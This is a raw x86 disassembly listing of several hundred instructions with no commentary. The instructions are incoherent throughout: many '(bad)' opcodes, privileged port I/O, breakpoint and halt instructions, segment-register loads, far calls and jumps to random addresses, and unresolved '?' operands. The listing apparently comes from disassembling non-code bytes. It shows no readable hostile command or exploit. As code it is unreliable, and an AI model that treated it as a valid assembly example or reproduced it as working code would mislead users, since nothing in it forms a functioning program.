  412785:	mov    ebx,DWORD PTR [ebp+0x6063b9ce]
  41278b:	addr16 mov ebx,0x4fdf0491
  412791:	sbb    BYTE PTR [esp+eax*8-0x3bb39147],0x50
  412799:	xchg   ebp,eax
  41279a:	or     edx,DWORD PTR [esp+ecx*4+0x54f390c9]
  4127a1:	js     0x412777
  4127a3:	mov    ebx,0xf6c3800b
  4127a8:	pop    ecx
  4127a9:	outs   dx,DWORD PTR ds:[esi]
  4127aa:	push   esi
  4127ab:	ja     0x412802
  4127ad:	xchg   edx,eax
  4127ae:	lds    eax,FWORD PTR [ebx]
  4127b0:	push   ds
  4127b1:	and    BYTE PTR [edx],ch
  4127b3:	pop    es
  4127b4:	(bad)  
  4127b6:	cmp    al,0x2e
  4127b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127b9:	inc    eax
  4127ba:	xor    BYTE PTR [edi-0x4b],bh
  4127bd:	xchg   esp,eax
  4127be:	jb     0x412828
  4127c0:	aaa    
  4127c1:	das    
  4127c2:	jle    0x4127ea
  4127c4:	xor    BYTE PTR ds:0x45ed7d48,0x71
  4127cb:	dec    ecx
  4127cc:	icebp  
  4127cd:	lds    eax,FWORD PTR [ecx]
  4127cf:	aam    0x48
  4127d1:	pop    esi
  4127d2:	fmul   st,st(5)
  4127d4:	push   0x3d3f48a8
  4127d9:	adc    esi,DWORD PTR [esi]
  4127db:	pop    DWORD PTR [ebx-0x57]
  4127de:	push   0x73659b0b
  4127e3:	jmp    0x4127c8
  4127e5:	mov    ah,0xcf
  4127e7:	stc    
  4127e8:	leave  
  4127e9:	out    0x7f,al
  4127eb:	fsubr  QWORD PTR [ebx]
  4127ed:	not    DWORD PTR [edx]
  4127ef:	jle    0x412788
  4127f1:	(bad)  
  4127f2:	out    dx,eax
  4127f3:	pop    esi
  4127f4:	fidiv  DWORD PTR [ecx+0x5b]
  4127f7:	xchg   BYTE PTR [esi+esi*2-0x46],bh
  4127fb:	dec    edi
  4127fc:	jmp    0x33c64b16
  412801:	mov    ah,0x26
  412803:	gs push edx
  412805:	dec    esi
  412806:	and    ch,dl
  412808:	cmp    bh,al
  41280a:	js     0x412811
  41280c:	outs   dx,BYTE PTR ds:[esi]
  41280d:	lahf   
  41280e:	sbb    eax,0xa3c91fbf
  412813:	mov    WORD PTR ss:[edi+0x5a],fs
  412817:	dec    ebp
  412818:	sbb    al,0x5e
  41281a:	or     al,0x4d
  41281c:	call   0xd4246a7b
  412821:	inc    eax
  412822:	and    bl,BYTE PTR [eax]
  412824:	or     al,0x9c
  412826:	in     eax,dx
  412827:	inc    edx
  412828:	stos   DWORD PTR es:[edi],eax
  412829:	add    cl,BYTE PTR [ebx-0x31]
  41282c:	stc    
  41282d:	lock test BYTE PTR [ebp+0x68067c7d],al
  412834:	or     BYTE PTR [ecx+0x5e],0xa6
  412838:	or     dh,BYTE PTR [edi-0x1868e1eb]
  41283e:	sub    BYTE PTR [edi],0x75
  412841:	add    al,0x6d
  412843:	or     al,0x77
  412845:	mov    dl,0x98
  412847:	add    BYTE PTR [edi-0x7e],dl
  41284a:	adc    ah,0x86
  41284d:	(bad)  
  41284e:	cmp    al,0x45
  412850:	dec    esp
  412851:	inc    esp
  412852:	and    DWORD PTR [ebx+0x1f491e6c],edi
  412858:	stos   BYTE PTR es:[edi],al
  412859:	push   ebp
  41285a:	fild   QWORD PTR [esi+ebx*1-0x19]
  41285e:	(bad)  
  41285f:	retf   
  412860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412861:	sbb    BYTE PTR [esi+0x2],cl
  412864:	dec    ebx
  412865:	push   0xffffff93
  412867:	hlt    
  412868:	inc    ecx
  412869:	(bad)  
  41286b:	sbb    edi,DWORD PTR ds:0x646eb6f2
  412871:	jbe    0x41284a
  412873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412874:	cmp    bh,BYTE PTR [ebx]
  412876:	in     al,dx
  412877:	jecxz  0x41288e
  412879:	jp     0x41283f
  41287b:	cld    
  41287c:	sub    BYTE PTR [ebx-0x4e],0x28
  412880:	fisttp DWORD PTR [esi-0x4f]
  412883:	(bad)  
  412884:	repz lock shl DWORD PTR [eax+0x2ae3120e],1
  41288c:	xchg   ebx,ecx
  41288e:	mov    BYTE PTR [edi-0x65363398],al
  412894:	(bad)  
  412895:	stos   BYTE PTR es:[edi],al
  412896:	dec    edi
  412897:	xchg   esi,eax
  412898:	adc    eax,0x1cda56b7
  41289d:	rol    edx,cl
  41289f:	stos   DWORD PTR es:[edi],eax
  4128a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128a1:	sub    edx,DWORD PTR [ecx]
  4128a3:	push   esp
  4128a4:	mov    dh,BYTE PTR [edi-0x4f008463]
  4128aa:	retf   
  4128ab:	es out 0x36,eax
  4128ae:	loope  0x4128cd
  4128b0:	adc    eax,0xfd92c2d7
  4128b5:	mov    esi,0xbdb92516
  4128ba:	add    al,0xbd
  4128bc:	pop    ds
  4128bd:	ss jb  0x412846
  4128c0:	popf   
  4128c1:	and    edx,eax
  4128c3:	add    ch,BYTE PTR [esi+0x20cf9e31]
  4128c9:	ret    
  4128ca:	test   al,0x15
  4128cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128cd:	push   es
  4128ce:	jle    0x4128a2
  4128d0:	inc    esp
  4128d1:	or     ah,BYTE PTR [ebx]
  4128d3:	test   al,0x58
  4128d5:	iret   
  4128d6:	mov    WORD PTR [edx+0x51],?
  4128d9:	aam    0x79
  4128db:	lea    ecx,[ebx+esi*4]
  4128de:	jl     0x4128fa
  4128e0:	xlat   BYTE PTR ds:[ebx]
  4128e1:	sub    DWORD PTR [edi],esi
  4128e3:	jae    0x412882
  4128e5:	std    
  4128e6:	lock inc ebp
  4128e8:	fwait
  4128e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ea:	mov    ?,WORD PTR [eax-0x18ec898b]
  4128f0:	fstp   DWORD PTR [ebx+esi*2-0xf147c4]
  4128f7:	dec    esi
  4128f8:	jno    0x412957
  4128fa:	jnp    0x412961
  4128fc:	retf   0x508b
  4128ff:	repnz lds ecx,FWORD PTR [ebp-0x6f0875cd]
  412906:	add    eax,0xc71f51ab
  41290b:	dec    edi
  41290c:	sbb    BYTE PTR [ecx+0x5a],dl
  41290f:	call   0xcb67:0x1b2576fe
  412916:	mov    edi,0x6bb9bf08
  41291b:	mov    esp,0xa7e689b6
  412920:	cld    
  412921:	xchg   edi,eax
  412922:	inc    ebx
  412923:	ins    BYTE PTR es:[edi],dx
  412924:	xor    bh,BYTE PTR [edx+0x64]
  412927:	dec    ebx
  412928:	jne    0x41291a
  41292a:	mov    ah,0x8a
  41292c:	or     ch,BYTE PTR [ecx+0x20e508e4]
  412932:	cmp    DWORD PTR [ebx+0x55],0x81328332
  412939:	fild   WORD PTR [edx]
  41293b:	jae    0x412979
  41293d:	leave  
  41293e:	icebp  
  41293f:	jp     0x412963
  412941:	sub    al,0x31
  412943:	mov    dl,0x8d
  412945:	cmp    BYTE PTR [ebx+0x3ce46151],dh
  41294b:	fistp  WORD PTR [eax-0x40]
  41294e:	call   0x86699fae
  412953:	dec    ebp
  412954:	mov    ebx,0x33557cf8
  412959:	cmc    
  41295a:	or     ebx,DWORD PTR [edi+0x6]
  41295d:	cdq    
  41295e:	ret    
  41295f:	hlt    
  412960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412961:	mov    edi,0x9499600e
  412966:	dec    ecx
  412967:	sahf   
  412968:	data16 sbb cl,BYTE PTR [ecx-0x2582a1c2]
  41296f:	sar    DWORD PTR [edx-0x38],1
  412972:	call   0xd2da:0xe002a632
  412979:	fwait
  41297a:	xchg   ebp,eax
  41297b:	mov    al,ds:0x50aef67f
  412980:	clc    
  412981:	outs   dx,BYTE PTR ds:[esi]
  412982:	je     0x412932
  412984:	push   ebx
  412985:	inc    ecx
  412987:	add    DWORD PTR [ecx-0x2e30afa3],edi
  41298d:	push   es
  41298e:	aas    
  41298f:	call   0x860f:0xf25bf169
  412996:	and    al,BYTE PTR [eax-0x5156ffc9]
  41299c:	xchg   ebp,eax
  41299d:	push   es
  41299e:	call   0x97d2d0c5
  4129a3:	cmp    al,0x40
  4129a5:	add    DWORD PTR [ebx+0x2a82ba4c],0xffffffa1
  4129ac:	(bad)  
  4129ad:	mov    ebp,0xaeeb1b58
  4129b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129b3:	mov    WORD PTR [edi],?
  4129b5:	push   ebx
  4129b6:	les    ebx,FWORD PTR ds:0x1415
  4129bb:	shl    DWORD PTR [esi+0xb],1
  4129be:	out    dx,eax
  4129bf:	xor    BYTE PTR [ebx-0x7c7d6e4f],ah
  4129c5:	mov    dh,0xe7
  4129c7:	and    esi,DWORD PTR [edx+0x27]
  4129ca:	mov    ebx,0x97e755c3
  4129cf:	ret    0x1b91
  4129d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129d3:	dec    edx
  4129d4:	aaa    
  4129d5:	jecxz  0x4129bf
  4129d7:	stc    
  4129d8:	inc    ecx
  4129d9:	fsub   DWORD PTR [edi]
  4129db:	xchg   esi,eax
  4129dc:	xor    bl,ch
  4129de:	inc    esi
  4129df:	push   cs
  4129e0:	in     eax,dx
  4129e1:	fs jge 0x412968
  4129e4:	or     al,0xa8
  4129e6:	pushf  
  4129e7:	mov    al,dl
  4129e9:	ror    BYTE PTR [edx],0xb
  4129ec:	and    ebp,DWORD PTR [edx]
  4129ee:	(bad)  
  4129ef:	fs cli 
  4129f1:	leave  
  4129f2:	and    al,0x66
  4129f4:	stc    
  4129f5:	call   0xc3de:0xc98e572e
  4129fc:	fbld   TBYTE PTR [ebx+0xd930231]
  412a02:	ins    BYTE PTR es:[edi],dx
  412a03:	cdq    
  412a04:	leave  
  412a05:	ins    BYTE PTR es:[edi],dx
  412a06:	and    ebx,edi
  412a08:	or     al,0x21
  412a0a:	or     eax,0xe654e4de
  412a0f:	xchg   edi,eax
  412a10:	xlat   BYTE PTR ds:[ebx]
  412a11:	es inc esp
  412a13:	jp     0x412a0e
  412a15:	mov    ebx,0x906d0c1
  412a1a:	rol    BYTE PTR [esi],1
  412a1c:	inc    eax
  412a1d:	popa   
  412a1e:	jl     0x412a8f
  412a20:	retw   0x2fdd
  412a24:	(bad)  
  412a25:	mov    cs,WORD PTR [ebx+0x1335208c]
  412a2b:	loope  0x4129cc
  412a2d:	cwde   
  412a2e:	in     al,dx
  412a2f:	mov    fs,WORD PTR [ebx+0x76]
  412a32:	rcl    bh,cl
  412a34:	fldcw  WORD PTR [esi]
  412a36:	das    
  412a37:	adc    edx,0xffffffba
  412a3a:	scas   eax,DWORD PTR es:[edi]
  412a3b:	cmp    ah,dh
  412a3d:	jmp    0x14a5b3e6
  412a42:	push   esi
  412a43:	dec    ebp
  412a44:	and    cl,BYTE PTR [ebp+edi*2+0x3e]
  412a48:	cmp    DWORD PTR [esi],esp
  412a4a:	jl     0x412a47
  412a4c:	mov    esp,0x59f98950
  412a51:	int3   
  412a52:	push   esi
  412a53:	je     0x412ab6
  412a55:	stos   DWORD PTR es:[edi],eax
  412a56:	cmp    DWORD PTR [ebp-0x4e],esi
  412a59:	loop   0x412ab5
  412a5b:	cmp    dh,BYTE PTR [esi-0x23139d18]
  412a61:	pop    edx
  412a62:	stc    
  412a63:	push   ds
  412a64:	mov    ch,0x36
  412a66:	repz in al,dx
  412a68:	add    eax,0xf86685e7
  412a6d:	sbb    ch,0xf9
  412a70:	mov    cl,0xe8
  412a72:	(bad)  
  412a73:	pop    ebp
  412a74:	(bad)  
  412a75:	mov    bl,0x21
  412a77:	ss jp  0x412a51
  412a7a:	ss in  eax,dx
  412a7c:	icebp  
  412a7d:	popa   
  412a7e:	fdivr  DWORD PTR [ecx-0x21dad06c]
  412a84:	and    bh,BYTE PTR [edx+0x76]
  412a87:	sub    edi,DWORD PTR [esi+eax*8]
  412a8a:	(bad)  
  412a8b:	arpl   WORD PTR [edx-0x5950259c],bp
  412a91:	daa    
  412a92:	push   eax
  412a93:	into   
  412a94:	scas   al,BYTE PTR es:[edi]
  412a95:	aad    0xed
  412a97:	loopne 0x412aca
  412a99:	repz jp 0x412a36
  412a9c:	lods   eax,DWORD PTR ds:[esi]
  412a9d:	sbb    al,0x7b
  412a9f:	(bad)  
  412aa0:	shr    BYTE PTR [edi],cl
  412aa2:	xor    al,0xe0
  412aa4:	adc    DWORD PTR [ecx],esp
  412aa6:	or     eax,DWORD PTR [edi+0xaace85d]
  412aac:	inc    ebx
  412aad:	push   0x9546a576
  412ab2:	xchg   ebp,eax
  412ab3:	inc    ebp
  412ab4:	jno    0x412a3b
  412ab6:	inc    ebx
  412ab7:	push   esi
  412ab8:	mov    BYTE PTR [edi],ah
  412aba:	push   esi
  412abb:	xor    BYTE PTR [ecx-0x13],bh
  412abe:	cmp    edi,esi
  412ac0:	aas    
  412ac1:	(bad)
  412ac5:	popf   
  412ac6:	inc    ebx
  412ac7:	pushf  
  412ac8:	imul   esp,DWORD PTR [eax],0x13
  412acb:	pop    edx
  412acc:	into   
  412acd:	xor    edi,esi
  412acf:	ret    0xbf15
  412ad2:	or     eax,0x8945e5fa
  412ad7:	push   ecx
  412ad8:	adc    esi,DWORD PTR [ebp-0x76]
  412adb:	aad    0x67
  412add:	jmp    0xf4cab8ed
  412ae2:	mov    bh,0x2
  412ae4:	int    0x54
  412ae6:	sub    eax,0xfd1ac9bd
  412aeb:	mov    ch,0x7e
  412aed:	mov    dh,0xe5
  412aef:	or     al,0xec
  412af1:	outs   dx,BYTE PTR ds:[esi]
  412af2:	lea    edx,[ecx-0x79]
  412af5:	test   al,0x64
  412af7:	sbb    DWORD PTR [ebx],edx
  412af9:	push   ds
  412afa:	addr16 jle 0x412afb
  412afd:	mul    ah
  412aff:	mov    al,0xf3
  412b01:	inc    edx
  412b02:	xor    esi,DWORD PTR [ebp-0x25]
  412b05:	hlt    
  412b06:	pop    ss
  412b07:	jmp    0xef09:0xfb78872b
  412b0e:	dec    edi
  412b0f:	mov    dh,0xe6
  412b11:	pop    ds
  412b12:	mov    ds,ebp
  412b14:	xchg   BYTE PTR [ebp*2+0x4db41b79],bh
  412b1b:	(bad)  
  412b1c:	call   0x304c1cfa
  412b21:	adc    ebp,edx
  412b23:	sti    
  412b24:	ds sub al,0x39
  412b27:	pop    ss
  412b28:	bound  eax,QWORD PTR ds:0x4883e782
  412b2e:	ins    BYTE PTR es:[edi],dx
  412b2f:	ror    BYTE PTR [ebx-0x4527a58e],1
  412b35:	mov    eax,DWORD PTR [ecx]
  412b37:	or     DWORD PTR [esi],eax
  412b39:	rol    DWORD PTR [ecx+0x2d7cbf16],1
  412b3f:	dec    BYTE PTR [esi-0x43a70aab]
  412b45:	gs mov eax,esi
  412b48:	mov    gs,esi
  412b4a:	cmp    eax,0xbb5789c7
  412b4f:	mov    ch,bh
  412b51:	test   eax,0x71e8dd60
  412b56:	rol    DWORD PTR [edi],0x29
  412b59:	lock call 0x8b82:0x79284dba
  412b61:	cmp    eax,0xa86480ba
  412b66:	pop    eax
  412b67:	xchg   ebx,eax
  412b68:	jg     0x412b0a
  412b6a:	retf   0xd18a
  412b6d:	in     al,dx
  412b6e:	pop    ecx
  412b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b70:	into   
  412b71:	sbb    ecx,DWORD PTR [ecx-0x27f0e311]
  412b77:	inc    eax
  412b78:	call   0x55f7:0x8569069d
  412b7f:	shr    DWORD PTR [ebx],cl
  412b81:	mov    BYTE PTR [edx-0x733a1096],bh
  412b87:	sbb    edi,DWORD PTR [ebx+0x57]
  412b8a:	imul   edx,DWORD PTR [edx+0x12a0029],0xecb96218
  412b94:	rcl    bl,0xaa
  412b97:	add    DWORD PTR [ebx-0x1a06d686],eax
  412b9d:	not    esp
  412b9f:	add    dl,BYTE PTR [ebp-0x53]
  412ba2:	in     eax,0x51
  412ba4:	or     al,0x81
  412ba6:	dec    esi
  412ba7:	sbb    esp,DWORD PTR [esp+esi*1]
  412baa:	mov    ecx,DWORD PTR [edi]
  412bac:	inc    ebx
  412bad:	lods   al,BYTE PTR ds:[esi]
  412bae:	mov    dh,0x4c
  412bb1:	xchg   esp,eax
  412bb2:	mov    dl,0xfa
  412bb4:	iret   
  412bb5:	mov    dl,0x1
  412bb7:	mov    bh,0xe
  412bb9:	scas   eax,DWORD PTR es:[edi]
  412bba:	and    BYTE PTR [edi+0x60162452],ch
  412bc0:	mov    ecx,DWORD PTR [ebx+0x148ec0dd]
  412bc6:	adc    al,0xfe
  412bc8:	cli    
  412bc9:	mov    ah,0xc0
  412bcb:	add    eax,0x8c14b5bf
  412bd0:	fistp  QWORD PTR [edi+esi*8+0x17]
  412bd4:	arpl   WORD PTR [ebp+0x6e],si
  412bd7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  412bd9:	dec    esp
  412bda:	jecxz  0x412b7d
  412bdc:	(bad)  
  412bde:	or     DWORD PTR [edx-0x54],esi
  412be1:	push   0xc80c56b2
  412be6:	jbe    0x412c58
  412be8:	xchg   ebp,eax
  412be9:	push   edx
  412bea:	loope  0x412c4c
  412bec:	pushf  
  412bed:	cmp    al,0xa7
  412bef:	sbb    BYTE PTR [ebx-0x62b0e2f],0x92
  412bf6:	test   DWORD PTR [edi+ebx*1],0x638d2fa0
  412bfd:	(bad)  
  412bfe:	icebp  
  412bff:	les    esp,FWORD PTR [ecx+0x1dd0afe1]
  412c05:	sti    
  412c06:	stc    
  412c07:	xor    BYTE PTR [ecx],dh
  412c09:	inc    eax
  412c0a:	aad    0x9b
  412c0c:	dec    ebp
  412c0d:	dec    esp
  412c0e:	xchg   esp,eax
  412c10:	xchg   ebp,eax
  412c11:	test   BYTE PTR [eax+0x40a8c358],0x2f
  412c18:	cmp    eax,0x937f9397
  412c1d:	push   esi
  412c1e:	mov    bl,0xc4
  412c20:	mov    ch,0xbc
  412c22:	scas   eax,DWORD PTR es:[edi]
  412c23:	mov    ebp,0x9c124b3a
  412c28:	dec    ebx
  412c29:	neg    BYTE PTR [edx-0x7f]
  412c2c:	adc    BYTE PTR [esi+0x71],dl
  412c2f:	jnp    0x412cac
  412c31:	sub    bl,BYTE PTR [esi]
  412c33:	cs pop edx
  412c35:	mov    esp,0xd2f6044d
  412c3a:	mov    dl,0xbf
  412c3c:	pop    ds
  412c3d:	ds fs mov ah,0x83
  412c41:	or     cl,BYTE PTR [eax-0x71]
  412c44:	and    ch,BYTE PTR [esi]
  412c46:	lock imul ecx,ecx,0x3f36e02c
  412c4d:	mov    al,ds:0xa7d3bbc8
  412c52:	cmp    al,0x46
  412c54:	imul   ecx,ebp,0x33
  412c57:	std    
  412c58:	adc    BYTE PTR ds:[ecx-0x6550aa77],bh
  412c5f:	mov    ebx,DWORD PTR [esi+0x43b400d9]
  412c65:	mov    bl,BYTE PTR [ebp+0x2935e9a6]
  412c6b:	pop    eax
  412c6c:	dec    esp
  412c6d:	mov    ebp,0xae6c3992
  412c72:	dec    ebx
  412c73:	sbb    eax,0x6da4189f
  412c78:	xor    al,0x8
  412c7a:	enter  0xe127,0xd5
  412c7e:	dec    edi
  412c7f:	push   edx
  412c80:	sar    DWORD PTR [edx],0x72
  412c83:	ds pop ebx
  412c85:	or     cl,ch
  412c87:	(bad)  
  412c88:	jmp    0x6d3f:0x2f0d014d
  412c8f:	xor    dl,ch
  412c91:	mov    esp,DWORD PTR [edx+esi*8+0x7e]
  412c95:	cmc    
  412c96:	lods   eax,DWORD PTR ds:[esi]
  412c97:	pop    ebx
  412c98:	fcom   DWORD PTR [esi]
  412c9a:	sub    eax,0xa8fdd8af
  412c9f:	mov    ds:0x25717546,eax
  412ca4:	mov    es,WORD PTR [edi]
  412ca6:	es gs aas 
  412ca9:	mov    ebp,0x6ccc986d
  412cae:	int    0x64
  412cb0:	mov    bl,0x75
  412cb2:	(bad)  
  412cb4:	mov    bh,0x33
  412cb6:	js     0x412cd1
  412cb8:	lds    ebp,FWORD PTR fs:[eax+ebx*1-0x16cbc66]
  412cc0:	nop
  412cc1:	fwait
  412cc2:	sub    eax,0xeefc0790
  412cc7:	jl     0x412cd0
  412cc9:	add    al,0xcd
  412ccb:	inc    ebp
  412ccc:	jp     0x412c90
  412cce:	sub    DWORD PTR [edi-0x25],edi
  412cd1:	cmp    BYTE PTR [ebx-0x12],ah
  412cd4:	in     al,0xc
  412cd6:	cwde   
  412cd7:	cmp    bh,0x74
  412cda:	push   esp
  412cdb:	jg     0x412d1a
  412cdd:	push   0xffffffc4
  412cdf:	and    dl,bh
  412ce1:	cld    
  412ce2:	aad    0x2e
  412ce4:	push   esp
  412ce5:	push   esi
  412ce6:	and    DWORD PTR [eax+ecx*8],0x373fc98b
  412ced:	imul   BYTE PTR [ecx+edx*1+0x5a]
  412cf1:	push   esp
  412cf2:	mov    cl,BYTE PTR [esi+0x7a2aa86c]
  412cf8:	xor    eax,0xd555394e
  412cfd:	cmp    eax,0xef406316
  412d02:	cli    
  412d03:	sub    al,0x42
  412d05:	(bad)  
  412d06:	cmc    
  412d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d08:	pop    ss
  412d09:	inc    ebx
  412d0a:	nop
  412d0b:	mov    ah,0xb
  412d0d:	inc    edx
  412d0e:	fcomi  st,st(0)
  412d10:	hlt    
  412d11:	cdq    
  412d12:	push   esi
  412d13:	sbb    cl,0xa1
  412d16:	dec    esp
  412d17:	ins    DWORD PTR es:[edi],dx
  412d18:	scas   eax,DWORD PTR es:[edi]
  412d19:	retf   0x8291
  412d1c:	clc    
  412d1d:	in     eax,0x32
  412d1f:	dec    eax
  412d20:	push   esp
  412d21:	xchg   ebp,eax
  412d22:	pop    esp
  412d23:	jo     0x412d95
  412d25:	sbb    ebx,0xb8ba88ed
  412d2b:	sub    eax,DWORD PTR [edi]
  412d2d:	cmp    ebp,DWORD PTR [edx+eiz*4+0x4a]
  412d31:	gs or  ah,ah
  412d34:	ror    BYTE PTR [ebp+0x3fdd3084],cl
  412d3a:	out    dx,al
  412d3b:	fdivr  DWORD PTR [ecx+0x6a]
  412d3e:	xchg   edx,eax
  412d3f:	pop    esp
  412d40:	add    cl,BYTE PTR [ecx+0x26f5b873]
  412d46:	imul   edx,DWORD PTR [ecx],0x1e
  412d49:	out    dx,al
  412d4a:	loopne 0x412d96
  412d4c:	push   ds
  412d4d:	fcmovnu st,st(3)
  412d4f:	dec    edi
  412d50:	mov    edx,0xd5ae8014
  412d55:	scas   al,BYTE PTR es:[edi]
  412d56:	push   0x4cf9fffc
  412d5b:	and    esp,ecx
  412d5d:	lods   al,BYTE PTR ds:[esi]
  412d5e:	js     0x412cfc
  412d60:	push   es
  412d61:	jl     0x412d76
  412d63:	cmp    ebx,ecx
  412d65:	stos   DWORD PTR es:[edi],eax
  412d66:	je     0x412d3f
  412d68:	and    DWORD PTR [ebp+0x7d],edx
  412d6b:	loopne 0x412cfc
  412d6d:	(bad)  [ecx-0x6b099dbd]
  412d73:	push   esp
  412d74:	or     al,0xe
  412d76:	es pop edx
  412d78:	std    
  412d79:	cld    
  412d7a:	push   esi
  412d7b:	or     al,0x7c
  412d7d:	xor    eax,0x5bef2415
  412d82:	cvtps2pi mm3,QWORD PTR [eax]
  412d85:	xor    BYTE PTR [esi+0x57110e58],bh
  412d8b:	fs push edx
  412d8d:	rcl    DWORD PTR [edx-0x785f5900],cl
  412d93:	imul   edx,DWORD PTR [eax],0xde4e2c6d
  412d99:	mov    edi,cs
  412d9b:	iret   
  412d9c:	call   0x9494:0x17c90ff2
  412da3:	or     bl,BYTE PTR [edi]
  412da5:	adc    al,0xe
  412da7:	xchg   ebp,eax
  412da8:	jp     0x412d95
  412daa:	push   edi
  412dab:	cld    
  412dac:	push   0x34d1b742
  412db1:	clc    
  412db2:	int    0x54
  412db4:	popf   
  412db5:	test   al,0x18
  412db7:	adc    BYTE PTR [edi-0x30],dl
  412dba:	inc    esp
  412dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dbc:	cld    
  412dbd:	stos   BYTE PTR es:[edi],al
  412dbe:	ss pushf 
  412dc0:	icebp  
  412dc1:	rol    BYTE PTR [edi-0x1de44f50],0x4c
  412dc8:	jno    0x412d73
  412dca:	push   edx
  412dcb:	into   
  412dcc:	cmp    BYTE PTR [ebx-0x3b3f68dc],dh
  412dd2:	xchg   BYTE PTR [esi-0x222fdb64],dh
  412dd8:	stc    
  412dd9:	ja     0x412dd2
  412ddb:	retf   0x1114
  412dde:	sahf   
  412ddf:	add    dh,ch
  412de1:	scas   eax,DWORD PTR es:[edi]
  412de2:	sub    eax,DWORD PTR [ecx-0x26]
  412de5:	fmul   DWORD PTR [edx+0x45]
  412de8:	and    al,0xf7
  412dea:	(bad)  
  412deb:	ins    BYTE PTR es:[edi],dx
  412dec:	cmp    esi,DWORD PTR [esi+0x1f61849c]
  412df2:	cmp    al,0x84
  412df4:	cdq    
  412df5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412df6:	ss mov al,0x1c
  412df9:	and    bh,BYTE PTR ds:0xfac2a2d5
  412dff:	mov    cl,ch
  412e01:	xor    al,0xf
  412e03:	dec    ecx
  412e04:	jecxz  0x412da6
  412e06:	inc    ecx
  412e07:	or     eax,0x81418a
  412e0c:	xchg   edi,eax
  412e0d:	cmp    BYTE PTR [ebx+edx*8],ch
  412e10:	xchg   ecx,eax
  412e11:	fld    QWORD PTR [edx+eax*8]
  412e14:	dec    ebx
  412e15:	nop
  412e16:	mov    cl,0x5a
  412e18:	xor    edx,esi
  412e1a:	inc    esp
  412e1b:	adc    ecx,ebp
  412e1d:	cmp    DWORD PTR [ebx+0xed5f391],0xb26c0f92
  412e27:	dec    eax
  412e28:	mov    ecx,0xb2a47c40
  412e2d:	fcomi  st,st(4)
  412e2f:	iret   
  412e30:	pop    ebp
  412e31:	or     cl,BYTE PTR [ebx]
  412e33:	div    BYTE PTR [ebx-0x3fc4cfa1]
  412e39:	mov    eax,0xe6b37dc5
  412e3e:	out    0x8e,al
  412e40:	mov    bh,BYTE PTR [ebp-0x3a1c18c5]
  412e46:	pushf  
  412e47:	pushf  
  412e48:	jo     0x412e0e
  412e4a:	add    DWORD PTR [esi+ebx*8],esp
  412e4d:	outs   dx,BYTE PTR ds:[esi]
  412e4e:	rol    DWORD PTR [edi],1
  412e50:	push   0xffffff9e
  412e52:	dec    esp
  412e53:	jle    0x412ed2
  412e55:	dec    edx
  412e56:	aam    0xcf
  412e58:	dec    eax
  412e59:	dec    ecx
  412e5a:	dec    ebx
  412e5b:	hlt    
  412e5c:	mov    edx,DWORD PTR [ebp+0x2e]
  412e5f:	xor    al,0x6f
  412e61:	enter  0xcbcc,0x5a
  412e65:	pop    edx
  412e66:	retf   
  412e67:	dec    edx
  412e68:	push   ebx
  412e69:	stos   DWORD PTR es:[edi],eax
  412e6a:	jae    0x412ee2
  412e6c:	rcl    BYTE PTR [ecx+ecx*2-0x4a],1
  412e70:	or     eax,0x35bd497c
  412e75:	popf   
  412e76:	jp     0x412edd
  412e78:	cmp    eax,0x5fbd136
  412e7d:	mov    edx,DWORD PTR [edi+0x1]
  412e80:	das    
  412e81:	jle    0x412e34
  412e83:	jbe    0x412e6b
  412e85:	das    
  412e86:	fistp  DWORD PTR ss:0x31493c38
  412e8d:	pop    ebp
  412e8e:	jne    0x412ee1
  412e90:	test   DWORD PTR ds:0x8e943460,eax
  412e96:	daa    
  412e97:	in     eax,dx
  412e98:	xor    esi,DWORD PTR ds:0xc126fa75
  412e9e:	fdiv   DWORD PTR [eax+0xe]
  412ea1:	shl    dl,1
  412ea3:	stos   BYTE PTR es:[edi],al
  412ea4:	rcl    esi,0xa2
  412ea7:	mov    cs,WORD PTR [esi]
  412ea9:	lea    ebx,[ecx]
  412eab:	cdq    
  412eac:	pop    ecx
  412ead:	lock inc DWORD PTR [esi+0x37]
  412eb1:	cld    
  412eb2:	(bad)  
  412eb3:	loop   0x412e4d
  412eb5:	inc    edx
  412eb6:	jno    0x412eff
  412eb8:	aas    
  412eb9:	sub    dl,BYTE PTR [edx]
  412ebb:	add    BYTE PTR [ecx],dh
  412ebd:	retf   0xdb42
  412ec0:	ss dec esi
  412ec2:	popa   
  412ec3:	scas   eax,DWORD PTR es:[edi]
  412ec4:	hlt    
  412ec5:	cld    
  412ec6:	or     ah,BYTE PTR [esi-0x5b]
  412ec9:	push   edx
  412eca:	push   0x11
  412ecc:	test   al,0x58
  412ece:	adc    dl,ch
  412ed0:	cwde   
  412ed1:	sbb    BYTE PTR [eax+edi*8-0x49],bl
  412ed5:	cdq    
  412ed6:	or     DWORD PTR [ecx+0x4b],edx
  412ed9:	mov    ds:0xe105d84f,eax
  412ede:	push   cs
  412edf:	or     ch,BYTE PTR [ecx+0x56]
  412ee2:	dec    ebp
  412ee3:	stc    
  412ee4:	jecxz  0x412e9b
  412ee6:	mov    ecx,DWORD PTR [edi]
  412ee8:	int    0x95
  412eea:	popa   
  412eeb:	adc    bh,BYTE PTR [esi]
  412eed:	(bad)  
  412eee:	(bad)  
  412eef:	loope  0x412ed9
  412ef1:	or     esp,DWORD PTR [ebp+0x34d6a2d4]
  412ef7:	jae    0x412eda
  412ef9:	mov    ebp,0x9f8038ea
  412efe:	push   0x25dbd28f
  412f03:	imul   edi,DWORD PTR [ebx+esi*1],0x8e54c17b
  412f0a:	loop   0x412ea1
  412f0c:	xor    bl,bl
  412f0e:	(bad)  
  412f10:	imul   esi,DWORD PTR [ebx-0x4487ec70],0x923c565d
  412f1a:	leave  
  412f1b:	and    eax,0xd8ed91d7
